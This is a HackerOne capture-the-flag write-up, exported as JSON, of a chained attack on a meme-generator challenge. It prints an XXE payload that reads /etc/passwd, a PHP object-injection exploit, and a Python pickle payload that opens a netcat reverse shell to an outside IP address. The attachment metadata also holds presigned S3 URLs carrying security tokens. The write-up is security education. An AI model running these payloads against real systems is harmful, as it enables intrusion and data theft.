@@ -1,0 +1,335 @@
+{
+  "id": 416004,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTYwMDQ=",
+  "url": "https://hackerone.com/reports/416004",
+  "title": "H1-5411 CTF Writeup",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-29T00:36:38.910Z",
+  "submitted_at": "2018-09-29T00:36:38.910Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "leetboi",
+    "url": "/leetboi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/198/715/a6af554d03396e57751d92e755289546d40ada21_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 33314,
+    "url": "https://hackerone.com/h1-5411-ctf",
+    "handle": "h1-5411-ctf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "h1-5411-CTF",
+      "twitter_handle": null,
+      "website": "http://tbd.com",
+      "about": null
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-10-22T16:01:52.525Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-08T16:25:21.749Z",
+  "team_member_agreed_on_going_public_at": "2018-10-22T16:01:52.451Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "So, Hackerone posted a tweet about the Meme CTF Where barcode was in the tweet image by scanning it and decoding from hex I found this link : https://h1-5411.h1ctf.com/ where we can  create/generate a memes and for generating the meme this was used form GitHub which i found in source code analysis `https://github.com/trepmal/meme-gen`.\n\n## Discovering Local File Read\n\nThere was a meme generator which generates the meme by from it's templates which was already present and it took 4 parameters: \n- template  ( name of the template which is used to generate meme ) \n- type ( Meme Type : image/text)\n- top-text \n- bottom-text\n\n{F352571}\n\nThe template parameter was vulnerable to local file read it take the file name available on the system and if present then it uses to create meme by adding the **Top** and **Bottom** Text.\n{F352576} \n\n{F352577}\n\n## Analysing the source code\n\nSince we have local file read we can download the source code of the application. by just changing the template parameter to 2 directory up `../../`.\n{F352580}\n\nIn this way I have downloaded the source code of the application one by one and arranged it to according to the web application.\n{F352584}\n\n**Finding vulnerability in Import memes( /api/import_memes_2.0.php)** : It was taking a file with serialised data with base64 encoded and then merging the files array in the session. \n\n```\n<?php\n  require_once(\"../includes/config.php\");\n\n  if (isset($_FILES['f'])) {\n    $new_memes = unserialize(base64_decode(file_get_contents($_FILES['f']['tmp_name'])));\n    \n    $_SESSION['memes'] = array_merge($_SESSION['memes'], $new_memes);\n  }\n\n  header(\"Location: /memes.php\");\n?>\n```\n\n\n**Finding vulnerability in classes.php**  The ` libxml_disable_entity_loader(false);` which disables the entity loader if the value is true. Since it was set to false so it allowed to load external entities.\n\n```\nclass ConfigFile {\n\n    function __construct($url) {\n      $this->config_raw = file_get_contents($url);\n    }\n\n    function parse() {\n      $dom = new DOMDocument();\n      $dom->loadXML($this->config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);\n      $o = simplexml_import_dom($dom);\n\n      $this->top_text = $o->toptext;\n      $this->bottom_text = $o->bottomtext;\n      $this->template = $o->template;\n      $this->type = $o->type;\n    }\n\n    function generate() {\n      $this->parse();\n\n      $meme_path = \"https://giphy.com/embed/Vuw9m5wXviFIQ?try_harder\";\n\n      if ($this->type == IMAGE) {\n        if (@is_array(getimagesize($this->path))) {\n          $meme_path = MEMES_FOLDER . $filename . \".jpg\";\n\n          $args = array(\n            \"top_text\"    => $top_text,\n            \"bottom_text\" => $bottom_text,\n            \"filename\"    => $meme_path,\n            \"font\"        => FONT_BASE,\n            \"memebase\"    => $this->path,\n            \"textsize\"    => 40,\n            \"textfit\"     => true,\n            \"padding\"     => 10,\n          );\n\n          memegen_build_image($args);\n        }\n      }\n\n      if ($this->type == TEXT) {\n        if (!@is_array(getimagesize($this->path))) {\n          $contents = file_get_contents($this->path);\n          $meme = \"  \" . strtoupper($top_text) . \"\\n\\n\" . $contents . \"\\n  \" . strtoupper($bottom_text);\n          $meme_path = MEMES_FOLDER . $filename . \".txt\";\n          file_put_contents($meme_path, $meme);\n        }\n      }\n\n      return $meme_path;\n    }\n\n    function __toString() {\n      $this->parse();\n      $debug = \"\";\n      $debug .= \"Debug Info :\\n\";\n      $debug .= \"TopText => {$this->top_text}\\n\";\n      $debug .= \"BottomText => {$this->bottom_text}\\n\";\n      $debug .= \"Template Location => {$this->template}\\n\";\n      $debug .= \"Template Type => {$this->type}\\n\";\n      return $debug;\n    }\n  }\n```\n\nThe `parse()` function was was parsing the xml entities with the desired elements(toptext, bottomtext, type, template). which makes it vulnerable to XXE. But till now we don't have any direct way to exploit XXE. The attack was intended to chain with each other. but to exploit the php object injection the magic method `__toString()` needs to be called because only `__wakup()` gets called when unserialize is used but here no wakeup method so. But I investigated the code and found a way where `__toString()` is called there is a loop is meme.php when the session is getting echoed there our uploaded file gets echoed too.\n\n\n### XML Payload :\n```\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>\n\t<toptext>&xxe;</toptext>\n\t<bottomtext>xd</bottomtext>\n\t<template></template>\n\t<type>text</type>\n</root>\n```\n### Serialised payload (base64 Decoded): \n```\nO:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:170:\"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>\n\t<toptext>&xxe;</toptext>\n\t<bottomtext>xd</bottomtext>\n\t<template></template>\n\t<type>text</type>\n</root>\";}\n```\n\n## Exploit for generating the serialised data : \n**Exploit.php**\n```\n<?php\n\nclass ConfigFile{\n\t\tpublic $config_raw = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>\n\t<toptext>&xxe;</toptext>\n\t<bottomtext>xd</bottomtext>\n\t<template></template>\n\t<type>text</type>\n</root>';\n\t}\n\n\techo base64_encode(serialize([new ConfigFile]));\n?>\n```\n\n## Chaining XXE with PHP Object Injection and escalating:\n\nSo I have created an exploit which generates a serialised the data and encoded to base64.\n{F352605}\n\n{F352604}\n\nSo, now we have a Preety good XXE and I was not able to escalate it further. So, I used the http wrapper in XXE to find local service and i found one on port 1337. and the description of the application was \n\n**Meme Service - Internal Maintenance API - v0.1 (Alpha); API Documentation: Version 0.1 - Endpoints: /status - View maintenance status; /update-status Change maintenance status; Debug: The debug parameter allows debugging**\n\n\nOn `status?debug=1` gives us the debug data/token base64 encoded in the response. decoding it to the base64 gives us the **Python Pickle Data**. Also `update-status?status` expects the parameter **status** for where I have generated a pickle code to generate a payload to get the reverse shell.\n\n**Exploit.py**\n\n```\n#!/usr/bin/env python\n#payload.py\nimport pickle\nimport socket\nimport os\nclass payload(object):\n    def __reduce__(self):\n       comm = \"rm /tmp/shell; mknod /tmp/shell p; nc 104.248.230.193 8008 0</tmp/shell | /bin/sh 1>/tmp/shell\"\n       return (os.system, (comm,))\npayload = pickle.dumps( payload())\n\nprint payload.encode(\"base64\")\n#!/usr/bin/env python\n#payload.py\nimport pickle\nimport socket\nimport os\nclass payload(object):\n    def __reduce__(self):\n       comm = \"rm /tmp/shell; mknod /tmp/shell p; nc 111.111.111.111 8008 0</tmp/shell | /bin/sh 1>/tmp/shell\"\n       return (os.system, (comm,))\npayload = pickle.dumps( payload())\n\nprint payload.encode(\"base64\")\n```\n\n\n**Generating a serialised payload**\n```\n<?php\nclass ConfigFile{\n\t\tpublic $config_raw = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL3NoZWxsOyBta25vZCAvdG1wL3NoZWxsIHA7IG5jIDEwNC4yNDguMjMwLjE5MyA4MDA4IDA8L3RtcC9zaGVsbCB8IC9iaW4vc2ggMT4vdG1wL3NoZWxsJwpwMQp0cDIKUnAzCi4=\"> ]><root>\n\t<toptext>&xxe;</toptext>\n\t<bottomtext>xd</bottomtext>\n\t<template></template>\n\t<type>text</type>\n</root>';\n\t}\n\n\techo base64_encode(serialize([new ConfigFile]));\n?>\n```\n\n## Reverse Connection and flag \n- Use the base64 encoded payload of pickle and then use it to create a serialised data.\n{F352614}\n{F352616}\n\nFlag : flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}\n\nThanks\nAhmed!\n\n## Impact\n\nnot required.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 352571,
+      "file_name": "Screen_Shot_2018-09-29_at_4.29.03_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/571/c54061615c07add9c7e5d78739ed64e4ba173759/Screen_Shot_2018-09-29_at_4.29.03_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-09-29_at_4.29.03_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-09-29_at_4.29.03_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074806Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnLZ%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bbaaf566e352d60356be089531c120bd79d6a34a291e44e4c3cf8e4169579834",
+      "file_size": 146468,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 352576,
+      "file_name": "Screen_Shot_2018-09-29_at_4.40.12_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/576/0bae2a5bf172b379425539effd162aa2937a6557/Screen_Shot_2018-09-29_at_4.40.12_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-09-29_at_4.40.12_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-09-29_at_4.40.12_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074806Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnLZ%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3ea7121f3048986e50f3715550b09662643b050e2200503cbc6e59da65e5901b",
+      "file_size": 72409,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 352577,
+      "file_name": "Screen_Shot_2018-09-29_at_4.40.21_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/577/4a90440224dcf5ca99e9b47a9847ab4c55a5c2b3/Screen_Shot_2018-09-29_at_4.40.21_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-09-29_at_4.40.21_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-09-29_at_4.40.21_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074806Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnLZ%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0067be3433f81066ab1f815b9976aad2edcb0f2eec9bc2dd76e0ffbc4ef14d64",
+      "file_size": 159950,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 352580,
+      "file_name": "Screen_Shot_2018-09-29_at_4.46.28_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/580/bbb6847b688cbebbd0fc0dfd4f7edb6131da3845/Screen_Shot_2018-09-29_at_4.46.28_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-09-29_at_4.46.28_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-09-29_at_4.46.28_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074806Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnLZ%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=789e71cd667cdebcd193382162b294b09fee153abc3b30f3740ba7e0b24c611e",
+      "file_size": 109676,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 352584,
+      "file_name": "Screen_Shot_2018-09-29_at_4.49.32_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/584/34413dcdda8ea632bfbdece2aa786d7a6181f723/Screen_Shot_2018-09-29_at_4.49.32_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-09-29_at_4.49.32_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-09-29_at_4.49.32_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074806Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnLZ%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=901327b34f409474bdc66de46964bfa592e26e7f87504fe88f0c9f6227ad9987",
+      "file_size": 396749,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 352604,
+      "file_name": "Screen_Shot_2018-09-29_at_5.25.11_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/604/781ce46ff1d99dc06a3c1dcdcdcdd92f3f8c5cc1/Screen_Shot_2018-09-29_at_5.25.11_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-09-29_at_5.25.11_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-09-29_at_5.25.11_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074806Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnL